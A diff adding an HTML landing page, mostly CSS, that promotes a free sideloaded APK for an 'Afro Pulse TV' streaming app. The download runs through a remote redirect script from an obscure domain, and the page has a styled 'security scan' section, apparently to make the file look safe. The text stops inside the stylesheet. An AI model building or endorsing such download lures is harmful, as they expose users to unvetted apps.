@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>Afro Pulse TV — Cinema in Your Pocket</title>
+<meta name="description" content="Afro Pulse TV — Stream blockbusters, watch live TV, and download for offline in 4K HDR. No ads. Download the free APK for Android.">
+<meta property="og:title" content="Afro Pulse TV — Cinema in Your Pocket">
+<meta property="og:description" content="Stream blockbusters, watch live TV, and download for offline in 4K HDR. No ads.">
+<meta property="og:image" content="img/t1.jpg">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/jpeg" href="img/logo.jpg">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+<script>
+/* ========== k2 — 核心跳转方法 ========== */
+function k2(){
+     MeetU.download(event);
+}
+</script>
+
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent;scroll-behavior:smooth;scroll-padding-top:90px}
+body{
+  font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'PingFang SC','Hiragino Sans GB','Microsoft YaHei',sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.6;
+  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+  overflow-x:clip;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit;touch-action:manipulation}
+a{color:inherit;text-decoration:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:8px}
+b,strong{font-weight:700}
+
+/* ============================================================
+   TOKENS — dark cinematic · electric Afro Pulse 
+   ============================================================ */
+:root{
+  --bg:#07080c;
+  --bg-2:#0b0d14;
+  --bg-3:#0f1219;
+  --surface:rgba(255,255,255,0.04);
+  --surface-2:rgba(255,255,255,0.06);
+  --line:rgba(255,255,255,0.08);
+  --line-strong:rgba(255,255,255,0.16);
+  --ink:#f2f4fa;
+  --ink-2:#b9bfce;
+  --ink-3:#7d8396;
+  --accent:#22d3ee;
+  --accent-2:#818cf8;
+  --accent-3:#c084fc;
+  --hot:#f43f5e;
+  --amber:#fbbf24;
+  --green:#34d399;
+  --grad:linear-gradient(120deg,#22d3ee 0%,#818cf8 55%,#c084fc 100%);
+  --grad-soft:linear-gradient(120deg,rgba(34,211,238,0.16),rgba(129,140,248,0.14) 55%,rgba(192,132,252,0.14));
+  --display:'Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+  --mono:'JetBrains Mono',ui-monospace,'SF Mono','Cascadia Code',Menlo,Consolas,monospace;
+  --radius-sm:12px;--radius-md:18px;--radius-lg:26px;--radius-full:9999px;
+  --ease:cubic-bezier(0.22,1,0.36,1);
+  --glow-cyan:0 0 60px rgba(34,211,238,0.35);
+  --glow-violet:0 0 60px rgba(129,140,248,0.35);
+}
+
+/* subtle film grain */
+body::after{
+  content:'';position:fixed;inset:0;z-index:2000;pointer-events:none;opacity:.035;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='2'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+  mix-blend-mode:overlay;
+}
+
+/* ============================================================
+   UTILITIES
+   ============================================================ */
+.container{width:100%;max-width:1200px;margin:0 auto;padding:0 20px;margin-top:-60px;}
+@media(min-width:768px){.container{padding:0 32px}}
+@media(min-width:1240px){.container{padding:0 40px}}
+.skip{position:absolute;left:-9999px;top:0;z-index:9999;background:var(--accent);color:#04121a;padding:10px 16px;border-radius:0 0 12px 0;font-weight:600}
+.skip:focus{left:0}
+
+.grad-text{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:9px;font-family:var(--display);font-weight:600;font-size:.95rem;letter-spacing:.01em;border-radius:14px;padding:14px 24px;transition:transform .22s var(--ease),background .22s,box-shadow .22s,border-color .22s,color .22s;white-space:nowrap}
+.btn svg{width:19px;height:19px;flex-shrink:0}
+.btn-primary{background:var(--grad);color:#04121a;box-shadow:0 10px 34px rgba(34,211,238,.28)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 18px 48px rgba(34,211,238,.4)}
+.btn-primary:active{transform:scale(.97)}
+.btn-ghost{background:rgba(255,255,255,.05);border:1px solid var(--line-strong);color:var(--ink)}
+.btn-ghost:hover{background:rgba(255,255,255,.1);border-color:rgba(255,255,255,.3);transform:translateY(-2px)}
+.btn-ghost:active{transform:scale(.97)}
+.btn-lg{padding:17px 30px;font-size:1.05rem;border-radius:16px}
+.btn-sm{padding:10px 18px;font-size:.86rem;border-radius:11px}
+
+.eyebrow{display:inline-flex;align-items:center;gap:9px;font-family:var(--mono);font-size:.68rem;font-weight:600;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);margin-bottom:14px}
+.eyebrow::before{content:'';width:20px;height:2px;background:var(--grad);border-radius:2px}
+
+.sec-head{max-width:680px;margin-bottom:44px}
+.sec-head .h2{font-family:var(--display);font-size:clamp(1.75rem,4.2vw,2.7rem);font-weight:700;line-height:1.06;letter-spacing:-.02em;color:var(--ink);text-wrap:balance}
+.sec-head .sub{margin-top:14px;font-size:.95rem;color:var(--ink-3);max-width:56ch}
+.sec-head.center{margin-left:auto;margin-right:auto;text-align:center}
+.sec-head.center .eyebrow{justify-content:center}
+.sec-head.center .eyebrow::before{display:none}
+.sec-head.center .eyebrow::after{content:'';width:20px;height:2px;background:var(--grad);border-radius:2px}
+
+/* ============================================================
+   REVEAL
+   ============================================================ */
+.reveal{opacity:0;transform:translateY(30px);transition:opacity .8s var(--ease),transform .8s var(--ease)}
+.reveal.in{opacity:1;transform:none}
+.reveal[data-d="1"]{transition-delay:.08s}
+.reveal[data-d="2"]{transition-delay:.16s}
+.reveal[data-d="3"]{transition-delay:.24s}
+.reveal[data-d="4"]{transition-delay:.32s}
+
+/* ============================================================
+   NAV — floating glass
+   ============================================================ */
+.nav{position:sticky;top:0;z-index:100;transition:background .3s,border-color .3s,backdrop-filter .3s}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;gap:16px;height:66px}
+.nav.scrolled{background:rgba(7,8,12,0.72);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.nav-brand{display:flex;align-items:center;gap:10px;font-family:var(--display);font-weight:700;font-size:1.12rem;letter-spacing:-.01em}
+.nav-brand img{width:32px;height:32px;border-radius:9px;box-shadow:0 0 0 1px var(--line-strong)}
+.nav-brand em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+.nav-links{display:none;align-items:center;gap:30px}
+@media(min-width:860px){.nav-links{display:flex}}
+.nav-links a{font-size:.9rem;color:var(--ink-2);font-weight:500;position:relative;padding:4px 0;transition:color .2s}
+.nav-links a::after{content:'';position:absolute;left:0;bottom:-2px;width:0;height:2px;background:var(--grad);border-radius:2px;transition:width .25s var(--ease)}
+.nav-links a:hover{color:var(--ink)}
+.nav-links a:hover::after{width:100%}
+.nav-cta{font-family:var(--display);font-weight:600;font-size:.88rem;padding:10px 20px;border-radius:12px;background:var(--grad);color:#04121a;box-shadow:0 8px 24px rgba(34,211,238,.24);transition:transform .2s var(--ease),box-shadow .2s}
+.nav-cta:hover{transform:translateY(-1px);box-shadow:0 12px 32px rgba(34,211,238,.36)}
+.nav-cta:active{transform:scale(.96)}
+
+/* ============================================================
+   HERO — cinematic image
+   ============================================================ */
+.hero{position:relative;min-height:100dvh;display:flex;align-items:center;overflow:hidden;padding:70px 0 60px}
+.hero-media{position:absolute;inset:0;z-index:0;overflow:hidden}
+.hero-media img{width:100%;height:100%;object-fit:cover;object-position:center;animation:kenburns 26s ease-in-out infinite alternate;will-change:transform}
+.hero-media::after{content:'';position:absolute;inset:0;background:
+  linear-gradient(90deg,rgba(7,8,12,0.82) 0%,rgba(7,8,12,0.38) 45%,rgba(7,8,12,0.05) 100%),
+  linear-gradient(180deg,rgba(7,8,12,0.52) 0%,rgba(7,8,12,0.05) 36%,rgba(7,8,12,0.06) 64%,rgba(7,8,12,0.62) 100%)}
+@keyframes kenburns{from{transform:scale(1) translate(0,0)}to{transform:scale(1.14) translate(-1.5%,1.5%)}}
+.hero-vignette{position:absolute;inset:0;z-index:2;pointer-events:none;background:radial-gradient(120% 90% at 50% 40%,transparent 56%,rgba(7,8,12,0.38) 100%)}
+.hero-inner{position:relative;z-index:3;max-width:780px;margin:0}
+.hero-badge{display:inline-flex;align-items:center;gap:9px;font-family:var(--mono);font-size:.72rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;color:var(--ink-2);padding:8px 16px;border-radius:var(--radius-full);background:rgba(255,255,255,0.05);border:1px solid var(--line-strong);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);margin-bottom:26px}
+.hero-badge .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(52,211,153,0.6);animation:pulse 2.2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(52,211,153,0.6)}70%{box-shadow:0 0 0 9px rgba(52,211,153,0)}100%{box-shadow:0 0 0 0 rgba(52,211,153,0)}}
+.hero-title{font-family:var(--display);font-size:clamp(2.7rem,7.5vw,5.2rem);font-weight:700;line-height:1.0;letter-spacing:-.03em;color:var(--ink);margin-bottom:22px;text-shadow:0 2px 30px rgba(7,8,12,0.55)}
+.hero-title-a{display:block}
+.hero-title-b{display:block;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent;text-shadow:none}
+.hero-desc{font-size:1.06rem;line-height:1.65;color:var(--ink-2);max-width:54ch;margin-bottom:34px;text-shadow:0 1px 18px rgba(7,8,12,0.5)}
+.hero-actions{display:flex;flex-wrap:wrap;align-items:center;gap:14px;margin-bottom:44px}
+.hero-stats{display:flex;gap:0;border-top:1px solid var(--line);padding-top:26px;max-width:520px}
+.hstat{flex:1;padding:0 20px}
+.hstat:first-child{padding-left:0}
+.hstat + .hstat{border-left:1px solid var(--line)}
+.hstat b{display:block;font-family:var(--display);font-size:1.9rem;font-weight:700;line-height:1;color:var(--ink);font-variant-numeric:tabular-nums}
+.hstat span{font-size:.74rem;color:var(--ink-3);letter-spacing:.02em}
+.hero-scroll{position:absolute;left:50%;bottom:24px;transform:translateX(-50%);z-index:2;display:flex;flex-direction:column;align-items:center;gap:8px;font-family:var(--mono);font-size:.62rem;letter-spacing:.2em;text-transform:uppercase;color:var(--ink-3)}
+.hero-scroll .mouse{width:22px;height:34px;border:1.5px solid var(--ink-3);border-radius:12px;position:relative}
+.hero-scroll .mouse::after{content:'';position:absolute;left:50%;top:7px;width:3px;height:7px;margin-left:-1.5px;border-radius:3px;background:var(--accent);animation:wheel 1.8s infinite}
+@keyframes wheel{0%{transform:translateY(0);opacity:1}70%{transform:translateY(10px);opacity:0}100%{transform:translateY(0);opacity:0}}
+
+/* ============================================================
+   STATS — marquee ticker
+   ============================================================ */
+.stats{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--bg-2);overflow:hidden;position:relative}
+.stats::before,.stats::after{content:'';position:absolute;top:0;bottom:0;width:120px;z-index:2;pointer-events:none}
+.stats::before{left:0;background:linear-gradient(90deg,var(--bg-2),transparent)}
+.stats::after{right:0;background:linear-gradient(-90deg,var(--bg-2),transparent)}
+.stats-track{display:flex;width:max-content;animation:marquee 34s linear infinite}
+.stats:hover .stats-track{animation-play-state:paused}
+@keyframes marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+.stats-group{display:flex;align-items:center;flex-shrink:0}
+.stat{display:flex;align-items:baseline;gap:12px;padding:30px 44px}
+.stat b{font-family:var(--display);font-size:2rem;font-weight:700;letter-spacing:-.01em;color:var(--ink);font-variant-numeric:tabular-nums}
+.stat span{font-size:.8rem;color:var(--ink-3);white-space:nowrap}
+.stat-sep{color:var(--accent);opacity:.55;font-size:.8rem}
+
+/* ============================================================
+   TRENDING — featured spotlight + ranked rail
+   ============================================================ */
+.sec{padding:96px 0 0}
+.trend-grid{display:grid;grid-template-columns:1fr;gap:20px}
+@media(min-width:900px){.trend-grid{grid-template-columns:1.15fr 1fr;align-items:stretch}}
+.trend-hero{position:relative;border-radius:var(--radius-lg);overflow:hidden;background:var(--bg-3);border:1px solid var(--line);display:flex;flex-direction:column;min-height:420px}
+.trend-hero-art{position:absolute;inset:0}
+.trend-hero-art img{width:100%;height:100%;object-fit:cover;filter:saturate(1.05)}
+.trend-hero-art::after{content:'';position:absolute;inset:0;background:linear-gradient(190deg,rgba(7,8,12,0.05) 30%,rgba(7,8,12,0.92) 82%)}
+.trend-hero-badge{position:absolute;top:18px;left:18px;z-index:2;font-family:var(--mono);font-size:.66rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:7px 13px;border-radius:var(--radius-full);background:var(--hot);color:#fff;box-shadow:0 6px 18px rgba(244,63,94,.4)}
+.trend-hero-info{position:relative;z-index:2;margin-top:auto;padding:26px}
+.trend-rank{font-family:var(--display);font-size:3.4rem;font-weight:700;line-height:1;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent;margin-bottom:8px}
+.trend-hero-info h3{font-family:var(--display);font-size:1.8rem;font-weight:700;letter-spacing:-.02em;color:#fff;margin-bottom:6px}
+.trend-hero-info p{font-size:.9rem;color:rgba(255,255,255,0.72);max-width:44ch;margin-bottom:16px}
+.trend-hero-meta{display:flex;align-items:center;gap:12px;font-family:var(--mono);font-size:.72rem;color:rgba(255,255,255,0.8);margin-bottom:20px}
+.trend-hero-meta .st{color:var(--amber);font-weight:700}
+.trend-rail{display:flex;flex-direction:column;gap:12px}
+.rail-item{display:flex;align-items:center;gap:16px;padding:12px;border-radius:var(--radius-md);background:var(--surface);border:1px solid var(--line);cursor:pointer;transition:transform .2s var(--ease),background .2s,border-color .2s}
+.rail-item:hover{transform:translateX(4px);background:var(--surface-2);border-color:var(--line-strong)}
+.rail-num{font-family:var(--display);font-size:1.5rem;font-weight:700;color:var(--ink-3);min-width:40px;text-align:center;transition:color .2s}
+.rail-item:hover .rail-num{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+.rail-thumb{width:52px;height:70px;border-radius:10px;object-fit:cover;flex-shrink:0;box-shadow:0 6px 16px rgba(0,0,0,0.4)}
+.rail-info{flex:1;min-width:0}
+.rail-info b{display:block;font-family:var(--display);font-size:.98rem;font-weight:600;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rail-info span{font-family:var(--mono);font-size:.68rem;color:var(--ink-3)}
+.rail-info span .st{color:var(--amber)}
+.rail-play{width:38px;height:38px;min-width:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:var(--grad);color:#04121a;box-shadow:0 6px 16px rgba(34,211,238,.3);transition:transform .2s var(--ease)}
+.rail-item:hover .rail-play{transform:scale(1.1)}
+.rail-play svg{width:16px;height:16px}
+
+/* ============================================================
+   LIVE — horizontal scroll cards
+   ============================================================ */
+.live-scroll{display:flex;gap:18px;overflow-x:auto;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;scrollbar-width:none;padding:4px 20px 20px}
+.live-scroll::-webkit-scrollbar{display:none}
+@media(min-width:768px){.live-scroll{padding:4px 32px 20px}}
+@media(min-width:1240px){.live-scroll{padding:4px 40px 20px}}
+.live-card{flex:0 0 78%;scroll-snap-align:start;position:relative;border-radius:var(--radius-lg);background:var(--bg-3);border:1px solid var(--line);padding:22px;min-height:210px;display:flex;flex-direction:column;overflow:hidden;transition:transform .25s var(--ease),border-color .25s}
+@media(min-width:640px){.live-card{flex:0 0 46%}}
+@media(min-width:900px){.live-card{flex:0 0 30%}}
+@media(min-width:1100px){.live-card{flex:0 0 23%}}
+.live-card::before{content:'';position:absolute;inset:0;background:radial-gradient(400px 220px at var(--gx,80%) var(--gy,0%),var(--c-glow,rgba(34,211,238,0.16)),transparent 70%);opacity:0;transition:opacity .3s}
+.live-card:hover{transform:translateY(-6px);border-color:var(--line-strong)}
+.live-card:hover::before{opacity:1}
+.live-top{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:.66rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:16px}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--hot);box-shadow:0 0 0 0 rgba(244,63,94,0.6);animation:live 1.6s infinite}
+@keyframes live{0%{box-shadow:0 0 0 0 rgba(244,63,94,0.6)}70%{box-shadow:0 0 0 8px rgba(244,63,94,0)}100%{box-shadow:0 0 0 0 rgba(244,63,94,0)}}
+.live-top .live-tag{color:var(--hot)}
+.live-viewers{margin-left:auto;font-weight:600;color:var(--ink-3);letter-spacing:0;text-transform:none}
+.live-ic{width:50px;height:50px;border-radius:14px;display:flex;align-items:center;justify-content:center;background:var(--c);color:#fff;box-shadow:0 10px 26px rgba(0,0,0,0.4);margin-bottom:16px}
+.live-ic svg{width:26px;height:26px}
+.live-card h4{font-family:var(--display);font-size:1.25rem;font-weight:700;color:var(--ink);letter-spacing:-.01em}
+.live-card p{font-size:.82rem;color:var(--ink-3);margin-top:4px;margin-bottom:18px}
+.live-play{margin-top:auto;display:inline-flex;align-items:center;gap:8px;align-self:flex-start;font-family:var(--display);font-size:.84rem;font-weight:600;color:var(--ink);padding:9px 16px;border-radius:var(--radius-full);background:rgba(255,255,255,0.06);border:1px solid var(--line-strong);transition:background .2s,color .2s,border-color .2s}
+.live-play:hover{background:var(--grad);color:#04121a;border-color:transparent}
+.live-play svg{width:14px;height:14px}
+
+/* ============================================================
+   FEATURES — numbered split list
+   ============================================================ */
+.feat-list{display:grid;grid-template-columns:1fr;gap:18px}
+@media(min-width:760px){.feat-list{grid-template-columns:1fr 1fr;gap:20px}}
+.feat-row{display:flex;gap:20px;align-items:flex-start;padding:26px;border-radius:var(--radius-lg);background:var(--surface);border:1px solid var(--line);position:relative;overflow:hidden;transition:transform .25s var(--ease),background .25s,border-color .25s}
+.feat-row::after{content:'';position:absolute;top:0;right:0;width:120px;height:120px;border-radius:50%;background:radial-gradient(circle,var(--f-glow,rgba(34,211,238,0.1)),transparent 70%);opacity:0;transition:opacity .3s}
+.feat-row:hover{transform:translateY(-4px);background:var(--surface-2);border-color:var(--line-strong)}
+.feat-row:hover::after{opacity:1}
+.feat-icon{width:56px;height:56px;min-width:56px;border-radius:16px;display:flex;align-items:center;justify-content:center;background:var(--f-soft,rgba(34,211,238,0.12));color:var(--f-c,#22d3ee);box-shadow:inset 0 0 0 1px rgba(255,255,255,0.06)}
+.feat-icon svg{width:28px;height:28px}
+.feat-text{flex:1}
+.feat-num{font-family:var(--mono);font-size:.68rem;font-weight:600;letter-spacing:.12em;color:var(--ink-3);display:block;margin-bottom:8px}
+.feat-text h3{font-family:var(--display);font-size:1.18rem;font-weight:700;color:var(--ink);letter-spacing:-.01em;margin-bottom:6px}
+.feat-text p{font-size:.86rem;color:var(--ink-2);line-height:1.6}
+
+/* ============================================================
+   TOGETHER — split panel
+   ============================================================ */
+.tog-panel{position:relative;border-radius:var(--radius-lg);background:linear-gradient(140deg,var(--bg-3),var(--bg-2));border:1px solid var(--line);overflow:hidden;padding:44px 28px;display:grid;grid-template-columns:1fr;gap:40px}
+@media(min-width:900px){.tog-panel{grid-template-columns:1.05fr 1fr;align-items:center;padding:64px}}
+.tog-panel::before{content:'';position:absolute;inset:0;background:radial-gradient(700px 400px at 85% 15%,rgba(129,140,248,0.12),transparent 65%)}
+.tog-copy{position:relative;z-index:1}
+.tog-copy h2{font-family:var(--display);font-size:clamp(1.7rem,3.6vw,2.4rem);font-weight:700;letter-spacing:-.02em;line-height:1.1;color:var(--ink);margin-bottom:28px}
+.tog-list{display:flex;flex-direction:column;gap:14px}
+.tog-item{display:flex;align-items:flex-start;gap:14px;padding:16px 18px;border-radius:var(--radius-md);background:rgba(255,255,255,0.03);border:1px solid var(--line);transition:background .2s,border-color .2s,transform .2s var(--ease)}
+.tog-item:hover{background:rgba(255,255,255,0.06);border-color:var(--line-strong);transform:translateX(4px)}
+.tog-item .tog-ic{width:34px;height:34px;min-width:34px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:var(--grad-soft);color:var(--accent)}
+.tog-item .tog-ic svg{width:17px;height:17px}
+.tog-item span{font-size:.9rem;color:var(--ink-2);line-height:1.5}
+.tog-item span strong{color:var(--ink);font-weight:600}
+.tog-visual{position:relative;z-index:1;display:flex;align-items:center;justify-content:center}
+.tog-orbit{position:relative;width:300px;height:300px;max-width:100%}
+.tog-avatar{position:absolute;width:74px;height:74px;border-radius:24px;overflow:hidden;box-shadow:0 0 0 3px var(--bg-2),0 14px 34px rgba(0,0,0,0.5);background:var(--grad)}
+.tog-avatar img{width:100%;height:100%;object-fit:cover}
+.tog-avatar.a1{top:8%;left:12%}
+.tog-avatar.a2{top:6%;right:12%}
+.tog-avatar.a3{bottom:8%;left:22%}
+.tog-avatar.a4{bottom:6%;right:20%}
+.tog-core{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:96px;height:96px;border-radius:50%;background:var(--grad);display:flex;align-items:center;justify-content:center;box-shadow:var(--glow-cyan)}
+.tog-core svg{width:40px;height:40px;color:#04121a}
+.tog-ring{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:250px;height:250px;border-radius:50%;border:1px dashed var(--line-strong);animation:spin 26s linear infinite}
+.tog-ring.r2{width:210px;height:210px;border-style:dotted;animation-duration:34s;animation-direction:reverse}
+@keyframes spin{from{transform:translate(-50%,-50%) rotate(0)}to{transform:translate(-50%,-50%) rotate(360deg)}}
+
+/* ============================================================
+   REVIEWS — masonry wall
+   ============================================================ */
+.rev-summary{display:flex;flex-wrap:wrap;align-items:center;gap:20px;margin-bottom:36px}
+.rev-big{font-family:var(--display);font-size:4rem;font-weight:700;line-height:1;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent;font-variant-numeric:tabular-nums}
+.rev-stars{display:flex;gap:4px}
+.rev-stars svg{width:20px;height:20px;color:var(--amber);filter:drop-shadow(0 0 6px rgba(251,191,36,0.4))}
+.rev-summary p{font-size:.86rem;color:var(--ink-3)}
+.rev-masonry{columns:1;column-gap:20px}
+@media(min-width:680px){.rev-masonry{columns:2}}
+@media(min-width:1020px){.rev-masonry{columns:3}}
+.rev-card{break-inside:avoid;margin-bottom:20px;border-radius:var(--radius-lg);background:var(--surface);border:1px solid var(--line);padding:24px;transition:transform .25s var(--ease),background .25s}
+.rev-card:hover{transform:translateY(-4px);background:var(--surface-2)}
+.rev-card .qmark{font-family:var(--display);font-size:3rem;line-height:1;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent;font-weight:700;margin-bottom:6px}
+.rev-card .rev-text{font-size:.92rem;color:var(--ink-2);line-height:1.68}
+.rev-card .rev-stars{margin-top:16px}
+.rev-card .rev-stars svg{width:15px;height:15px}
+.rev-who{display:flex;align-items:center;gap:12px;margin-top:18px;padding-top:16px;border-top:1px solid var(--line)}
+.rev-av{width:42px;height:42px;min-width:42px;border-radius:14px;overflow:hidden;box-shadow:0 0 0 1px var(--line-strong)}
+.rev-av img{width:100%;height:100%;object-fit:cover}
+.rev-name{font-size:.88rem;font-weight:600;color:var(--ink)}
+.rev-name span{display:flex;align-items:center;gap:5px;font-weight:500;font-size:.68rem;color:var(--accent);margin-top:2px}
+.rev-name span .v{color:var(--green)}
+.rev-break{break-inside:avoid;margin-bottom:20px;border-radius:var(--radius-lg);background:var(--bg-3);border:1px solid var(--line);padding:24px}
+.rev-break h4{font-family:var(--display);font-size:.95rem;font-weight:700;color:var(--ink);margin-bottom:16px}
+.rev-bar-row{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.rev-bar-row:last-child{margin-bottom:0}
+.rev-bar-row .lb{font-family:var(--mono);font-size:.74rem;color:var(--ink-2);width:34px}
+.rev-bar{flex:1;height:8px;border-radius:6px;background:rgba(255,255,255,0.06);overflow:hidden}
+.rev-bar i{display:block;height:100%;border-radius:6px;background:var(--grad)}
+.rev-bar-row .pct{font-family:var(--mono);font-size:.72rem;color:var(--ink-3);width:38px;text-align:right}
+
+/* ============================================================
+   SECURITY — terminal scan report
+   ============================================================ */
+.sec-terminal{position:relative;border-radius:var(--radius-lg);background:#0a0c12;border:1px solid var(--line-strong);overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.5)}
+.term-bar{display:flex;align-items:center;gap:8px;padding:14px 18px;background:rgba(255,255,255,0.03);border-bottom:1px solid var(--line)}
+.term-bar .td{width:11px;height:11px;border-radius:50%}
+.term-bar .td.r{background:#ff5f57}
+.term-bar .td.y{background:#febc2e}
+.term-bar .td.g{background:#28c840}
+.term-bar .term-title{margin-left:10px;font-family:var(--mono);font-size:.72rem;color:var(--ink-3)}
+.term-body{padding:26px 22px;font-family:var(--mono);font-size:.82rem;line-height:2.1}
+@media(min-width:768px){.term-body{padding:32px 30px}}
+.term-line{color:var(--ink-2)}
+.term-line .prompt{color:var(--accent)}
+.term-line .arg{color:var(--amber)}
+.term-line.ok{color:var(--green)}
+.term-line.ok .tag{color:var(--green)}
+.term-line.ok .desc{color:var(--ink-3)}
+.term-line.dim{color:var(--ink-3)}
+.term-cursor{display:inline-block;width:9px;height:1.1em;background:var(--accent);vertical-align:-2px;margin-left:2px;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.sec-badges{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-top:22px}
+.sec-badge{display:flex;align-items:center;gap:14px;padding:18px;border-radius:var(--radius-md);background:var(--surface);border:1px solid var(--line)}
+.sec-badge .sb-ic{width:42px;height:42px;min-width:42px;border-radius:12px;display:flex;align-items:center;justify-content:center;background:var(--grad-soft);color:var(--green)}
+.sec-badge .sb-ic svg{width:22px;height:22px}
+.sec-badge b{display:block;font-family:var(--display);font-size:.92rem;font-weight:600;color:var(--ink)}
+.sec-badge span{font-size:.74rem;color:var(--ink-3)}
+
+/* ============================================================
+   DOWNLOAD — split panel + phone mock
+   ============================================================ */
+.dl-panel{position:relative;border-radius:var(--radius-lg);overflow:hidden;background:linear-gradient(150deg,#0d1020,#07080c);border:1px solid var(--line-strong);display:grid;grid-template-columns:1fr;gap:40px;padding:48px 28px}
+@media(min-width:960px){.dl-panel{grid-template-columns:1.1fr 1fr;align-items:center;padding:72px 64px}}
+.dl-panel::before{content:'';position:absolute;inset:0;background:radial-gradient(680px 420px at 20% 10%,rgba(34,211,238,0.14),transparent 60%)}
+.dl-copy{position:relative;z-index:1}
+.dl-logo{width:72px;height:72px;border-radius:20px;overflow:hidden;margin-bottom:24px;box-shadow:0 0 0 1px var(--line-strong),0 20px 50px rgba(0,0,0,0.5)}
+.dl-logo img{width:100%;height:100%;object-fit:cover}
+.dl-copy h2{font-family:var(--display);font-size:clamp(1.9rem,4vw,2.8rem);font-weight:700;letter-spacing:-.02em;line-height:1.05;color:var(--ink);margin-bottom:16px}
+.dl-copy h2 em{font-style:normal;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-fill-color:transparent}
+.dl-copy>p{font-size:.98rem;color:var(--ink-2);max-width:48ch;margin-bottom:24px}
+.dl-trust{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:28px}
+.dl-trust .ti{display:inline-flex;align-items:center;gap:7px;font-size:.76rem;font-weight:600;color:var(--ink-2);padding:8px 14px;border-radius:var(--radius-full);background:rgba(255,255,255,0.05);border:1px solid var(--line-strong)}
+.dl-trust .ti svg{width:14px;height:14px;color:var(--green);flex-shrink:0}
+.dl-actions{display:flex;flex-wrap:wrap;align-items:center;gap:16px}
+.dl-backup{font-family:var(--mono);font-size:.78rem;font-weight:600;color:var(--ink-2);text-decoration:underline;text-underline-offset:4px;transition:color .2s}
+.dl-backup:hover{color:var(--accent)}
+.dl-note{font-family:var(--mono);font-size:.7rem;color:var(--ink-3);margin-top:18px}
+.dl-note b{color:var(--green);font-weight:600}
+.dl-phone{position:relative;z-index:1;display:flex;justify-content:center}
+.phone{position:relative;width:250px;height:500px;border-radius:40px;background:#0c0e15;border:1px solid var(--line-strong);box-shadow:0 40px 90px rgba(0,0,0,0.6),var(--glow-violet);overflow:hidden}
+.phone-notch{position:absolute;top:12px;left:50%;transform:translateX(-50%);width:90px;height:22px;border-radius:12px;background:#000;z-index:3}
+.phone-screen{padding:46px 14px 16px;height:100%}
+.ps-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.ps-bar b{font-family:var(--display);font-size:.82rem;color:var(--ink)}
+.ps-bar .ps-live{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:.58rem;color:var(--hot)}
+.ps-bar .ps-live i{width:6px;height:6px;border-radius:50%;background:var(--hot)}
+.ps-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
